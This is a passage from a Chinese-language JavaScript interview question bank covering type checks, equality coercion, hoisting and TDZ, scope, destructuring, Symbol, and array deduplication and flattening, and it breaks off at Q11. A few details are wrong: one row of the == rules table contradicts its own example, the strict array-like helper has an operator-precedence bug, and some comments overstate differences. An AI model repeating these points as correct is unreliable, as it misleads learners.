---
---
# JavaScript 面试题库（2025-2026 企业实战版）

> 本题库共 **50 道**题目，按难度分为三层：基础层 ★☆☆（16 题）、进阶层 ★★☆（19 题）、专家层 ★★★（15 题），覆盖 JavaScript 核心知识体系的 12 大模块、58 个核心考点。

---

# 一、基础层 ★☆☆（Q01 - Q16）

---

## Q01: 请详细说明 `typeof` 操作符的所有返回值，并解释其中的「陷阱」（null、函数、对象）。另外说明 `isNaN` 与 `Number.isNaN` 的区别。
- **难度**：★☆☆
- **知识点**：数据类型、typeof、NaN
- **题型**：简答题

### 参考答案要点：

#### 1. typeof 返回值表

| 类型 | typeof 结果 | 示例 |
|:---|:---|:---|
| Undefined | `"undefined"` | `typeof undefined` |
| Boolean | `"boolean"` | `typeof true` |
| Number | `"number"` | `typeof 42` |
| String | `"string"` | `'hello'` |
| Symbol (ES6) | `"symbol"` | `Symbol()` |
| BigInt (ES2020) | `"bigint"` | `42n` |
| Function | `"function"` | `function(){}` |
| 其他对象 | `"object"` | `{}`, `[]`, `null`, `/reg/`, `new Date()` |

#### 2. 三大陷阱

**陷阱一：`typeof null === 'object'`**
```javascript
// 这是 JS 历史遗留 Bug
// 早期 JS 用低位存储类型信息，000 代表 object，而 null 的机器码全为 0
// 所以被误判为 object
typeof null; // "object" ❌ 应该是 "null"
```

**陷阱二：函数是特殊的对象**
```javascript
typeof function(){} // "function" — 可调用对象有特殊标记
// 但 Function 本质上也是 Object 的子类型
```

**陷阱三：无法区分具体对象类型**
```javascript
typeof []        // "object" — 无法区分数组
typeof {}        // "object"
typeof /regex/   // "object" — 无法区分正则
typeof new Date() // "object"
```

#### 3. isNaN vs Number.isNaN

```javascript
// isNaN() — 会先对参数做隐式 Number() 转换，再判断
isNaN('hello')    // true  — 'hello' 转为 NaN，所以返回 true
isNaN(undefined)  // true  — undefined 转为 NaN
isNaN({})         // true  — {} 转为 NaN
isNaN(NaN)        // true  // ✅ 这个是对的

// Number.isNaN() — 不做类型转换，严格判断是否为 NaN
Number.isNaN('hello')   // false — 字符串不是 NaN
Number.isNaN(undefined) // false
Number.isNaN({})        // false
Number.isNaN(NaN)       // true  // ✅ 只有真正的 NaN 才返回 true
```

**核心区别**：
- `isNaN(x)` 等价于 `Number.isNaN(Number(x))`
- `Number.isNaN` 是 ES6 新增的可靠方法，**推荐使用**

#### 4. 判断 NaN 的最佳实践

```javascript
// 方法1：Number.isNaN（推荐）
Number.isNaN(value)

// 方法2：利用 NaN 是唯一不等于自身的值
value !== value

// 方法3：Object.is（ES6）
Object.is(value, NaN) // true
```

### 🔍 追问链

1. **typeof null === 'object' 的历史原因是什么？**
   → 方向：JS 最初用低位存储类型信息，null 全零被误判为 object；TC39 曾提案修复但为了兼容性放弃
2. **如何准确判断 null？**
   → 方向：`x === null`（最简单）、`Object.prototype.toString.call(null)`（最通用）、`x == null && typeof x === 'object'`
3. **typeof 能判断函数但不能判断数组，为什么？**
   → 方向：typeof 对 function 有特殊返回值 'function'，但对 Array 只返回 'object'

---

## Q02: 详细说明 `==` 和 `===` 的区别，并列出 `==` 的完整隐式转换规则表。
- **难度**：★☆☆
- **知识点**：隐式转换、相等运算符
- **题型**：简答题

### 参考答案要点：

#### 1. 核心区别

- `===`（严格相等）：**不进行类型转换**，类型不同直接返回 `false`
- `==`（宽松相等）：**允许隐式类型转换**后再比较

#### 2. == 完整隐式转换规则表（ECMAScript 规范 Abstract Equality Comparison）

| 类型 x | 类型 y | 转换规则 | 示例 |
|:---|:---|:---|:---|
| 同类型 | 同类型 | 直接比较（除 NaN） | `1 === 1` → true |
| null | undefined | **互相等于**（不转换） | `null == undefined` → true ✅ |
| number | string | string → number | `'1' == 1` → true |
| boolean | 任意 | boolean → number | `true == 1` → true |
| object | string/number/symbol | object → primitive（valueOf/toString） | `[1] == 1` → true |
| 其他不同类型 | 其他不同类型 | **false** | `[] == false` → true（需推导） |

#### 3. 经典易错案例

```javascript
// ⚠️ 这些结果可能违反直觉
0 == ''          // true  — '' 转为 0
0 == '0'         // true
false == ''      // true  — false 转为 0，'' 转为 0
false == '0'     // true
false == []      // true  — [] → '' → 0；false → 0
[] == ![]        // true  — ![] = false → 0；[] → '' → 0
[] == 0          // true
[1] == 1         // true
[1,2] == '1,2'   // true

// ✅ 这些是安全的比较
null == undefined // true （唯一特例）
NaN == NaN        // false （NaN 不等于任何值，包括自身）
undefined == 0    // false
null == 0         // false
```

#### 4. 推荐原则

> **永远使用 `===`，除非你明确知道自己在做什么且需要 `==` 的特殊行为（如 `x == null` 判断 null 或 undefined）**

```javascript
// 唯一推荐的 == 用法：同时判断 null 和 undefined
if (value == null) {
  // value 为 null 或 undefined
}
// 等价于：value === null || value === undefined
```

### 🔍 追问链

1. **[] == ![] 为什么是 true？逐步推导过程？**
   → 方向：![] 先转布尔 false → [] == false → ToNumber([]) = 0 → 0 == 0 → true
2. **实际项目中应该用 == 还是 ===？有没有 == 更合适的场景？**
   → 方向：推荐始终使用 ===；== 唯一合理场景是 `if (x == null)` 等价于 `x === null || x === undefined`
3. **Object.is() 和 === 有什么区别？什么时候用 Object.is？**
   → 方向：Object.is(NaN, NaN) 为 true（=== 为 false）；Object.is(+0, -0) 为 false（=== 为 true）

---

## Q03: JavaScript 中有哪些常见的类型转换陷阱？请举例说明。
- **难度**：★☆☆
- **知识点**：类型转换、隐式转换
- **题型**：代码分析题

### 参考答案要点：

#### 1. 字符串拼接中的数字

```javascript
// + 号有一边是字符串时，另一边也会转为字符串
1 + '1'     // '11'（字符串拼接，不是数学加法）
'1' + 1     // '11'
1 + 2 + '3' // '33'（先算 1+2=3，再拼接 '3'）
'1' + 2 + 3 // '123'（从左到右，先拼接成 '12'，再拼接 '3'）
```

#### 2. 减法自动转数字

```javascript
// 除 + 外的运算符都会尝试转为数字
'5' - 2     // 3（字符串 '5' 转为数字 5）
'5' * 2     // 10
'5' / '2'   // 2.5
'5' % 2     // 1

// 但如果无法转为有效数字
'abc' - 1   // NaN
```

#### 3. truthy/falsy 值陷阱

```javascript
// falsy 值列表（8 个）
false, 0, -0, 0n, '', null, undefined, NaN

// ⚠️ 易错：空数组、空对象都是 truthy
Boolean([])    // true
Boolean({})    // true
Boolean('0')   // true  — 非空字符串都是 truthy

// 实际应用中的陷阱
const arr = [];
if (arr) { console.log('truthy'); } // 输出！因为 [] 是 truthy
if (arr.length === 0) { /* 正确判断空数组 */ }
```

#### 4. 对象转原始值的顺序

```javascript
// 对象在需要转原始值时的转换顺序：
// 1. 先调用 valueOf()
// 2. 如果 valueOf 返回原始值，使用它
// 3. 否则调用 toString()
// 4. 如果 toString 返回原始值，使用它
// 5. 否则抛出 TypeError

const obj = {
  valueOf() { return 1; },
  toString() { return '2'; }
};
obj + 1  // 2（优先用 valueOf）

const obj2 = {
  valueOf() { return {}; },  // 返回对象，继续找 toString
  toString() { return '3'; }
};
obj2 + 1  // '31'（toString 返回字符串，做拼接）

// Date 对象特殊：优先 toString
const date = new Date();
String(date)  // 调用 toString
Number(date)  // 调用 valueOf
```

#### 5. 一元 + 转数字

```javascript
+''           // 0
+'123'        // 123
+'abc'        // NaN
+true         // 1
+false        // 0
+null         // 0
+undefined    // NaN
+[]           // 0（[].toString() = '' → Number('') = 0）
+[1]          // 1（[1].toString() = '1'）
+[1,2]        // NaN（[1,2].toString() = '1,2' → Number('1,2') = NaN）
```

#### 6. 双重否定 !! 取布尔值

```javascript
!!0          // false
!!''         // false
!!null       // false
!!undefined  // false
!!NaN        // false
!!{}         // true
!![]         // true
!!'hello'    // true
```

---

## Q04: 判断一个变量是否为数组有哪些方式？请详细分析每种方式的优缺点和适用场景。
- **难度**：★☆☆
- **知识点**：数组检测、Array.isArray
- **题型**：简答题

### 参考答案要点：

#### 方式一：Array.isArray()（ES5+，✅ 推荐）

```javascript
Array.isArray([1, 2, 3]);        // true
Array.isArray('hello');          // false
Array.isArray({ length: 2 });    // false

// ✅ 优点：最可靠，能正确处理跨 realm（iframe）的情况
// ❌ 缺点：IE9- 不支持（需 polyfill）
```

#### 方式二：instanceof Array

```javascript
[1, 2, 3] instanceof Array;  // true

// ❌ 缺陷：跨 iframe/realm 时失效
// 不同全局环境的 Array 构造函数不同
const iframe = document.createElement('iframe');
document.body.appendChild(iframe);
const iframeArray = iframe.contentWindow.Array;
iframeArray.isArray([1,2]); // 可能报错或返回错误结果
new iframeArray(1,2,3) instanceof Array; // false！因为原型链不对
```

#### 方式三：Object.prototype.toString.call()

```javascript
Object.prototype.toString.call([1, 2, 3]); // '[object Array]'
Object.prototype.toString.call({});         // '[object Object]'
Object.prototype.toString.call('hello');    // '[object String]'

// 封装通用类型检测函数
function getType(obj) {
  return Object.prototype.toString.call(obj).slice(8, -1);
}
getType([1,2]);    // 'Array'
getType(new Date()); // 'Date'
getType(/reg/);    // 'RegExp'

// ✅ 优点：万能方法，跨 realm 安全，可检测所有内置类型
// ❌ 缺点：写法较长；ES6 后可被 Symbol.toStringTag 影响（见下文）
```

##### ⚠️ 扩展：`Symbol.toStringTag` 的影响（ES6+）

ES6 引入了 `Symbol.toStringTag`，它可以**自定义** `Object.prototype.toString.call()` 的返回值：

```javascript
// 普通对象无法修改内部 [[Class]]，但可以用 Symbol.toStringTag 影响 toString
const obj = {
  [Symbol.toStringTag]: 'Array'
};
Object.prototype.toString.call(obj); // '[object Array]' — 被骗了！

// 自定义类也可以定义 toStringTag
class MyArray {
  get [Symbol.toStringTag]() {
    return 'Array';
  }
}
const myArr = new MyArray();
Object.prototype.toString.call(myArr); // '[object Array]'
Array.isArray(myArr);                  // false — isArray 不受影响，更可靠
```

> **注意**：这是**主动**定义的，正常代码不会故意把对象伪装成数组。但这也说明：
> - `Array.isArray()` 比 `Object.prototype.toString.call()` **更可靠**（专门检测数组内部槽）
> - 对于一般的类型检测场景，`Object.prototype.toString.call()` 仍然足够好用

#### 方式四：Duck Typing（鸭子类型判断）

```javascript
function isArrayLike(obj) {
  // 类数组判断：有 length 属性且是数字
  return obj != null && typeof obj === 'object' && typeof obj.length === 'number';
}

isArrayLike([1,2]);              // true
isArrayLike({ length: 2, 0:'a', 1:'b' }); // true（arguments、NodeList 等）
isArrayLike('hello');             // true（字符串也有 length）

// 更严格的类数组判断
function isStrictArrayLike(obj) {
  return obj != null &&
    typeof obj[Symbol.iterator] === 'function' ||
    (typeof obj.length === 'number' && obj.length >= 0);
}
```

#### 总结对比表

| 方法 | 可靠性 | 跨 Realm | 防 `__proto__` 篡改 | 防 `Symbol.toStringTag` | 兼容性 | 推荐度 |
|:---|:---:|:---:|:---:|:---:|:---:|:---:|
| `Array.isArray()` | ⭐⭐⭐ | ✅ 安全 | ✅ 安全 | ✅ 安全 | ES5+ | ⭐⭐⭐ **首选** |
| `Object.prototype.toString.call()` | ⭐⭐ | ✅ 安全 | ✅ 安全 | ❌ 可被改写 | 全兼容 | ⭐⭐⭐ 通用类型检测 |
| `instanceof` | ⭐ | ❌ 失效 | ❌ 失效 | ❌ 不相关 | 全兼容 | ⭐ 仅限同环境 |
| Duck Typing | ⭐ | ✅ 安全 | ❌ 失效 | ❌ 不相关 | 全兼容 | ⭐ 类数组场景 |

---

## Q05: 请详细对比 `var`、`let`、`const` 三种变量声明方式的异同。
- **难度**：★☆☆
- **知识点**：变量声明、ES6
- **题型**：简答题

### 参考答案要点：

#### 完整对比表

| 特性 | var | let | const |
|:---|:---:|:---:|:---:|
| 作用域 | **函数作用域** | **块级作用域 `{}`** | **块级作用域 `{}`** |
| 变量提升 | ✅ 提升（值为 `undefined`） | ✅ 提升（TDZ） | ✅ 提升（TDZ） |
| 暂时性死区（TDZ） | ❌ 无 | ✅ 有 | ✅ 有 |
| 重复声明 | ✅ 允许 | ❌ 报错 | ❌ 报错 |
| 重新赋值 | ✅ 允许 | ✅ 允许 | ❌ **不允许** |
| 全局声明挂载 | 挂载到 `window` | 不挂载 | 不挂载 |
| 初始化要求 | 可不初始化 | 可不初始化 | **必须初始化** |

#### 代码示例

```javascript
// ====== 1. 作用域差异 ======
function testVar() {
  if (true) {
    var a = 1;
  }
  console.log(a); // 1 — var 是函数作用域，if 块外可访问
}

function testLet() {
  if (true) {
    let b = 2;
  }
  // console.log(b); // ReferenceError! let 是块级作用域
}

// ====== 2. 变量提升差异 ======
console.log(c); // undefined — var 提升但未赋值
var c = 1;

// console.log(d); // ReferenceError! 进入 TDZ
let d = 2;

// ====== 3. 重复声明 ======
var e = 1;
var e = 2; // ✅ 允许

let f = 1;
// let f = 2; // SyntaxError: Identifier 'f' has already been declared

// ====== 4. 全局挂载 ======
var g = 1;
console.log(window.g); // 1 — var 在全局声明会挂载到 window

let h = 2;
console.log(window.h); // undefined — let 不会

// ====== 5. const 的特殊性 ======
const i = { name: 'obj' };
i.name = 'modified';  // ✅ 允许修改属性
// i = {};            // ❌ 不允许改变引用（重新赋值）
// const j;           // ❌ 必须初始化

// const 声明数组同理
const arr = [1, 2, 3];
arr.push(4);  // ✅ 允许操作数组
// arr = [];   // ❌ 不允许重新赋值
```

#### 最佳实践建议

```javascript
// 默认使用 const — 表示该变量不会被重新赋值
const API_URL = 'https://api.example.com';

// 确实需要重新赋值时使用 let
let count = 0;
count++;

// 永远不要在新代码中使用 var
// 除非维护老代码或需要特殊的函数作用域行为
```

### 🔍 追问链

1. **const 声明的对象可以修改属性吗？为什么？**
   → 方向：可以！const 冻结的是变量绑定（不能重新赋值），不是冻结对象内容。需要 Object.freeze() 来冻结对象
2. **for 循环中 var 和 let 的行为差异是什么？（经典闭包题）**
   → 方向：var 是函数作用域，循环内所有迭代共享同一个 i；let 是块级作用域，每次迭代创建新的绑定
3. **暂时性死区（TDZ）在实际开发中遇到过吗？有什么坑？**
   → 方向：class 声明前访问会报 TDZ 错误；let/const 在 switch case 中可能遇到跨 case 访问问题

---

## Q06: 什么是暂时性死区（TDZ）？什么是变量提升（Hoisting）？请分别说明 var、function、let、class 各自的提升行为。
- **难度**：★☆☆
- **知识点**：TDZ、Hoisting、变量提升
- **题型**：简答题 + 代码分析题

### 参考答案要点：

#### 1. 变量提升（Hoisting）定义

JS 引擎在**代码执行前**，会先将变量和函数声明的内存分配好，这就是「提升」。**只有声明被提升，赋值不会被提升**。

#### 2. 四种声明的提升行为对比

```javascript
// ====== var：声明 + 初始化为 undefined 都被提升 ======
console.log(a); // undefined（不会报错）
var a = 10;

// 编译后等价于：
// var a;          ← 声明提升到这里
// console.log(a); // undefined
// a = 10;         ← 赋值留在原地

// ====== function 声明：整体提升（声明 + 定义都提升）=====
console.log(fn()); // 'hello'（可以正常调用！）
function fn() { return 'hello'; }

// ====== 函数表达式：只有 var 被提升，值为 undefined ======
// console.log(fe()); // TypeError: fe is not a function
var fe = function() { return 'hi'; };

// ====== let/const：声明提升，但进入 TDZ ======
// console.log(b); // ReferenceError: Cannot access 'b' before initialization
let b = 20;

// ====== class：声明提升，进入 TDZ（类似 let）=====
// const inst = new MyClass(); // ReferenceError
class MyClass {}

// ====== class 表达式：类似函数表达式 ======
// const inst2 = new MyExpr(); // ReferenceError（TDZ）
const MyExpr = class {};
```

#### 3. 暂时性死区（TDZ）

TDZ 指**从块的作用域开始到变量声明语句之间**的区域。在这个区域内访问变量会抛出 `ReferenceError`。

```javascript
{
  // ========== TDZ 开始 ==========
  // 此时 tmp 已经被「绑定」到当前作用域，但还不能使用
  // console.log(tmp); // ReferenceError!

  // 即使在 TDZ 内部使用 typeof 也是不安全的
  // typeof tmp; // ReferenceError!（这是 TDZ 的特点）

  let tmp = 'hello'; // ========== TDZ 结束 ==========
  console.log(tmp); // 'hello'
}

// TDZ 的实际意义：防止变量在声明前被意外使用，提前暴露潜在 bug
```

#### 4. TDZ 的隐蔽场景

```javascript
// 场景1：函数默认参数中的 TDZ
// var x = 1; // 注意这里
function foo(x = y, y = 2) {
  return [x, y];
}
// foo(); // ReferenceError! y 在初始化前被访问（y 在 x 的默认值中使用时还在 TDZ）

// 正确写法：调整参数顺序
function bar(y = 2, x = y) {
  return [x, y];
}
bar(); // [2, 2]

// 场景2：解构赋值中的 TDZ
let { x: y } = { x: y }; // ReferenceError! y 还未初始化就被使用了

// 场景3：class 中 TDZ 导致的问题
const inst = new Foo(); // ReferenceError!
class Foo {
  // constructor 内部的静态属性引用也可能触发 TDZ
  static prop = Foo;    // OK，class 声明已完成
}
```

---

## Q07: 解释 JavaScript 的作用域链（Scope Chain）查找机制。什么是块级作用域？它与 IIFE 有什么关系？
- **难度**：★☆☆
- **知识点**：作用域链、词法作用域、IIFE
- **题型**：简答题

### 参考答案要点：

#### 1. 作用域链查找机制

当访问一个变量时，JS 引擎会**从当前作用域开始，逐层向外查找**，直到找到变量或到达全局作用域。这个查找路径就是**作用域链**。

```javascript
var globalVar = 'global';

function outer() {
  var outerVar = 'outer';

  function inner() {
    var innerVar = 'inner';
    // 访问 innerVar → 当前作用域找到 ✅
    // 访问 outerVar → 当前没有，沿作用域链向上 → outer 作用域找到 ✅
    // 访问 globalVar → 继续向上 → 全局作用域找到 ✅
    // 访问 notExist → 所有作用域都没有 → ReferenceError
    console.log(innerVar, outerVar, globalVar);
  }
  inner();
}
outer();

// 作用域链示意：
// inner scope → outer scope → global scope
```

**关键点**：
- 作用域链在**函数定义时确定**（词法/静态作用域），而非调用时
- 每个函数执行时会创建一个**执行上下文**，包含变量对象和作用域链引用
- 查找到即停止（**遮蔽效应**：内层变量会遮蔽外层同名变量）

#### 2. 块级作用域（Block Scope）

ES6 之前 JS 只有**函数作用域**和**全局作用域**，没有块级作用域。`let` 和 `const` 引入了块级作用域——`{}` 包裹的区域就是一个块作用域。

```javascript
// ES5 时代的问题：var 不会创建块级作用域
for (var i = 0; i < 3; i++) {
  setTimeout(() => console.log(i), 100);
}
// 输出：3, 3, 3（因为 var i 是函数作用域，循环结束后 i=3）

// ES6 解决方案：let 创建块级作用域
for (let j = 0; j < 3; j++) {
  setTimeout(() => console.log(j), 100);
}
// 输出：0, 1, 2（每次迭代都有独立的 j）

// if/while/for/try-catch 的 {} 都是块级作用域
if (true) {
  let blockScoped = '只在 if 块内有效';
}
// console.log(blockScoped); // ReferenceError
```

#### 3. IIFE（立即执行函数表达式）

ES5 时代模拟块级作用域的方式：

```javascript
// IIFE 基本形式
(function() {
  var privateVar = 'IIFE 内部变量';
  // 这里的变量不会污染外部作用域
})();

// IIFE 的几种写法
(function() { ... })();           // 最常用
(function() { ... }());           // 也可以
!function() { ... }();            // 一元运算符形式
+function() { ... }();
~function() { ... }();

// IIFE 的用途
// 1. 创建独立作用域，避免全局污染
(function() {
  var moduleA = { /* ... */ };
  window.ModuleA = moduleA;       // 只暴露需要的接口
})();

// 2. 闭包保存状态（解决循环问题，见 Q19）
for (var i = 0; i < 3; i++) {
  (function(j) {
    setTimeout(() => console.log(j), 100);
  })(i);  // 立即传入当前 i 的值
}
// 输出：0, 1, 2

// ES6 之后 IIFE 的使用大幅减少
// 因为 let/const 已经提供了原生的块级作用域
```

---

## Q08: 请详细介绍 ES6 解构赋值的完整语法，包括默认值、嵌套解构、剩余元素、模式匹配等。
- **难度**：★☆☆
- **知识点**：解构赋值、ES6
- **题型**：简答题 + 代码分析题

### 参考答案要点：

#### 1. 数组解构

```javascript
// 基本解构
const [a, b, c] = [1, 2, 3];
// a=1, b=2, c=3

// 跳过元素
const [first, , third] = [1, 2, 3];
// first=1, third=3

// 剩余元素（rest）
const [head, ...tail] = [1, 2, 3, 4];
// head=1, tail=[2, 3, 4]
// 注意：rest 元素必须放在最后

// 默认值
const [x = 10, y = 20] = [1];
// x=1, y=20（y 使用默认值）

// 默认值可以是表达式（惰性求值：只有在需要时才执行）
const [fn = getDefault()] = [1]; // getDefault() 不会执行
const [fn2 = getDefault()] = []; // getDefault() 会执行
function getDefault() {
  console.log('default called');
  return 'default';
}

// 交换变量
let m = 1, n = 2;
[m, n] = [n, m];

// 嵌套解构
const [[p, q], r] = [[1, 2], 3];
// p=1, q=2, r=3
```

#### 2. 对象解构

```javascript
// 基本解构
const { name, age } = { name: 'Tom', age: 18 };

// 重命名
const { name: userName, age: userAge } = { name: 'Tom', age: 18 };
// userName='Tom', userAge=18

// 默认值
const { x = 1, y = 2 } = { x: 10 };
// x=10, y=2

// 嵌套解构 + 重命名 + 默认值
const {
  info: { address: addr = '未知' },
  tags: [firstTag]
} = {
  info: { address: '北京' },
  tags: ['js', 'ts']
};
// addr='北京', firstTag='js'

// 计算属性名（动态 key）
const key = 'name';
const { [key]: value } = { name: 'dynamic' };
// value='dynamic'

// 剩余属性（rest）
const { a, b, ...rest } = { a: 1, b: 2, c: 3, d: 4 };
// a=1, b=2, rest={c:3, d:4}
```

#### 3. 函数参数解构

```javascript
// 对象参数解构 + 默认值
function greet({ name, greeting = 'Hello' }) {
  return `${greeting}, ${name}!`;
}
greet({ name: 'World' }); // 'Hello, World!'
greet({ name: 'World', greeting: 'Hi' }); // 'Hi, World!'

// 整体默认值（参数本身可以为 undefined 时）
function config({ host = 'localhost', port = 3000 } = {}) {
  return { host, port };
}
config();                    // {host:'localhost', port:3000}
config({ host: '127.0.0.1' });// {host:'127.0.0.1', port:3000}

// 数组参数解构
function sum([first, second, ...rest]) {
  return first + second + rest.reduce((a, b) => a + b, 0);
}
sum([1, 2, 3, 4]); // 10
```

#### 4. 字符串解构

```javascript
const [char1, char2, ...chars] = 'hello';
// char1='h', char2='e', chars=['l','l','o']

const { length, 0: firstChar } = 'hello';
// length=5, firstChar='h'
```

#### 5. 解构赋值的注意事项

```javascript
// ⚠️ 1. 右侧必须是可迭代对象（数组解构时）
// const [a] = {}; // TypeError: {} is not iterable

// ⚠️ 2. 已声明变量解构需要用括号包裹
let x, y;
// { x, y } = { x: 1, y: 2 }; // SyntaxError!
({ x, y } = { x: 1, y: 2 }); // ✅ 用括号包裹变成表达式

// ⚠️ 3. 解构 undefined/null 会报错（除非有默认值）
// const { a } = null; // TypeError: Cannot destructure property 'a' of null
const { b = 'default' } = null || undefined; // 仍然报错
// 安全做法：
const { c = 'default' } = someObj ?? {}; // 用 ?? 提供 fallback 对象
```

### 🔍 追问链

1. **解构时默认值何时生效？undefined vs null？**
   → 方向：只有值为 undefined 时默认值才生效！null 不会触发默认值
2. **嵌套解构中如何给中间层设置默认值？**
   → 方向：`const { a: { b = 42 } = {} } = obj` — 中间层也要给默认空对象
3. **解构赋值和 rest 参数如何配合实现数组拆分？**
   → 方向：`const [first, ...rest] = arr` — 取出首元素，剩余元素组成新数组

---

## Q09: Symbol 是什么？它的主要用途和应用场景有哪些？
- **难度**：★☆☆
- **知识点**：Symbol、ES6
- **题型**：简答题

### 参考答案要点：

#### 1. Symbol 基本概念

Symbol 是 ES6 引入的**第 7 种基本数据类型**，表示**独一无二的值**。

```javascript
const s1 = Symbol('description');
const s2 = Symbol('description');
s1 === s2; // false — 每个 Symbol 都是唯一的

// Symbol() 不能用 new 调用（基本类型）
// new Symbol(); // TypeError

// Symbol 作为属性名
const key = Symbol('id');
const obj = {
  [key]: 42,
  name: 'normal'
};
obj[key];    // 42
obj['name']; // normal
```

#### 2. 主要应用场景

##### 场景一：消除魔术字符串（Magic String）

```javascript
// ❌ 差的做法：硬编码字符串
if (type === 'open') { ... }
if (type === 'close') { ... }

// ✅ 好的做法：用 Symbol 替代
const ActionType = {
  OPEN: Symbol('open'),
  CLOSE: Symbol('close'),
  SAVE: Symbol('save')
};

function handleAction(type) {
  switch (type) {
    case ActionType.OPEN: /* ... */ break;
    case ActionType.CLOSE: /* ... */ break;
  }
}
// 优点：值唯一，不会被意外覆盖；调试时可看到 description
```

##### 场景二：模拟私有属性

```javascript
const _private = Symbol('private');

class Counter {
  constructor() {
    this[_private] = 0;  // 私有属性
  }
  increment() {
    this[_private]++;
    return this[_private];
  }
}

const c = new Counter();
c.increment(); // 1
c._private;    // undefined — 无法通过常规方式访问
// 但注意：Symbol 属性并非真正私有，可通过 Reflect.ownKeys 获取
Reflect.ownKeys(c); // 可以看到 Symbol 属性

// ES2022+ 更推荐使用 # 私有字段（真正的私有）
class ModernCounter {
  #count = 0;  // 真正私有，外部完全不可访问
  increment() { return ++this.#count; }
}
```

##### 圆景三：内置 Symbol（Well-known Symbols）

JavaScript 内置了许多 Symbol 常量，用于自定义对象的核心行为：

```javascript
// Symbol.iterator — 使对象可迭代（for...of）
const iterable = {
  data: [1, 2, 3],
  [Symbol.iterator]() {
    let index = 0;
    return {
      next: () => ({
        done: index >= this.data.length,
        value: this.data[index++]
      })
    };
  }
};
for (const val of iterable) {
  console.log(val); // 1, 2, 3
}

// 其他重要的 Well-known Symbols:
Symbol.toStringTag   // Object.prototype.toString 的自定义标签
Symbol.toPrimitive   // 对象转原始值的方法
Symbol.hasInstance   // 自定义 instanceof 行为
Symbol.species       // 派生对象的构造函数
Symbol.isConcatSpreadable // Array.concat 是否展开
```

##### 场景四：避免属性名冲突（库/框架开发中常用）

```javascript
// 库 A 和库 B 都想给对象添加 metadata 属性
// 用字符串可能会冲突
// 用 Symbol 保证唯一

const LIB_A_META = Symbol.for('lib-a.meta');
const LIB_B_META = Symbol.for('lib-b.meta');

function enhance(obj) {
  obj[LIB_A_META] = { version: '1.0' };
  obj[LIB_B_META] = { author: 'libB' };
  return obj;
}
```

#### 3. Symbol 的关键 API

```javascript
// Symbol.for() — 全局注册表（相同 description 返回同一个 Symbol）
const s3 = Symbol.for('global');
const s4 = Symbol.for('global');
s3 === s4; // true — 从全局注册表中获取

// Symbol.keyFor() — 反查全局 Symbol 的 description
Symbol.keyFor(s3); // 'global'
Symbol.keyFor(Symbol('local')); // undefined — 非全局 Symbol

// 获取对象的所有 Symbol 属性
const sym = Symbol('test');
const obj2 = { [sym]: 1, a: 2 };
Object.keys(obj2);           // ['a'] — 不包含 Symbol
Object.getOwnPropertyNames(obj2); // ['a']
Object.getOwnPropertySymbols(obj2); // [sym] — 只获取 Symbol 属性
Reflect.ownKeys(obj2);       // ['a', sym] — 获取所有属性
```

---

## Q10: 实现数组去重有哪些方法？请写出至少 5 种，并分析各自的性能特点和适用场景。
- **难度**：★☆☆
- **知识点**：数组方法、Set、性能
- **题型**：编程实践题

### 参考答案要点：

#### 方法一：Set（ES6，✅ 最推荐）

```javascript
function uniqueBySet(arr) {
  return [...new Set(arr)];
}

uniqueBySet([1, 2, 2, 3, 3, 3]); // [1, 2, 3]
// 优点：代码简洁，时间复杂度 O(n)，适用于大多数场景
// 缺点：无法去重对象（按引用比较）
```

#### 方法二：filter + indexOf

```javascript
function uniqueByFilter(arr) {
  return arr.filter((item, index) => arr.indexOf(item) === index);
}

// 时间复杂度 O(n²) — indexOf 每次都要遍历
// 优点：兼容性好，无需 ES6
// 缺点：大数据量性能差
```

#### 方法三：forEach / for...of + 对象/Map

```javascript
function uniqueByMap(arr) {
  const map = new Map();
  arr.forEach(item => map.set(item, true));
  return [...map.keys()];
}

// 或者用普通对象（仅适用于键可为字符串/数字的情况）
function uniqueByObj(arr) {
  const obj = {};
  const result = [];
  arr.forEach(item => {
    if (!obj[item]) {
      obj[item] = true;
      result.push(item);
    }
  });
  return result;
}
// 时间复杂度 O(n)
```

#### 方法四：reduce

```javascript
function uniqueByReduce(arr) {
  return arr.reduce((acc, item) => {
    if (!acc.includes(item)) acc.push(item);
    return acc;
  }, []);
}
// 时间复杂度 O(n²)
```

#### 方法五：for 循环 + includes（双重循环思想）

```javascript
function uniqueByLoop(arr) {
  const result = [];
  for (let i = 0; i < arr.length; i++) {
    let exists = false;
    for (let j = 0; j < result.length; j++) {
      if (arr[i] === result[j]) {
        exists = true;
        break;
      }
    }
    if (!exists) result.push(arr[i]);
  }
  return result;
}
// 最原始的方式，O(n²)
```

#### 性能对比

| 方法 | 时间复杂度 | 空间复杂度 | 适用场景 | 推荐度 |
|:---|:---:|:---:|:---|:---:|
| `[...new Set(arr)]` | **O(n)** | O(n) | **日常首选** | ⭐⭐⭐ |
| `Map` 版本 | **O(n)** | O(n) | 需要保留顺序 | ⭐⭐⭐ |
| `filter + indexOf` | O(n²) | O(n) | 小数组/旧浏览器 | ⭐⭐ |
| `reduce + includes` | O(n²) | O(n) | 函数式风格偏好 | ⭐ |
| 双重 for 循环 | O(n²) | O(n) | 学习理解 | ⭐ |

#### 特殊情况：对象数组去重

```javascript
// 按某个属性去重
function uniqueByKey(arr, key) {
  const seen = new Map();
  return arr.filter(item => {
    const val = item[key];
    if (seen.has(val)) return false;
    seen.set(val, true);
    return true;
  });
}

const users = [
  { id: 1, name: 'Alice' },
  { id: 2, name: 'Bob' },
  { id: 1, name: 'Alice-Dup' },
];
uniqueByKey(users, 'id');
// [{id:1,name:'Alice'}, {id:2,name:'Bob'}]
```

### 🔍 追问链

1. **Set 去重的原理是什么？能去重引用类型吗？**
   → 方向：Set 用 SameValueZero 算法比较；引用类型比较的是地址，所以 `{a:1} !== {a:1}`
2. **flat(Infinity) 扁平化的性能怎么样？大数据量有更好的方案吗？**
   → 方向：递归 reduce 或栈实现的扁平化可控性更好；flat 内部也是递归
3. **如何对对象数组按某个字段去重？**
   → 方向：Map + 字段值作为 key：`Array.from(new Map(arr.map(item => [item.id, item])).values())`

---

## Q11: 实现数组扁平化（flatten）有哪些方法？请写出至少 4 种。
- **难度**：★☆☆
- **知识点**：数组方法、递归、flat
- **题型**：编程实践题

### 参考答案要点：

#### 方法一：flat()（ES2019，✅ 最简单）

```javascript
const arr = [1, [2, [3, [4]]]];

arr.flat();           // [1, 2, [3, [4]]]  — 默认展平 1 层
arr.flat(1);          // [1, 2, [3, [4]]]  — 同上
arr.flat(2);          // [1, 2, 3, [4]]    — 展平 2 层
arr.flat(Infinity);   // [1, 2, 3, 4]      — 完全展平

// 优点：原生 API，简洁高效
// 缺点：ES2019+，老旧环境需 polyfill
```

#### 方法二：递归 + concat + reduce

```javascript
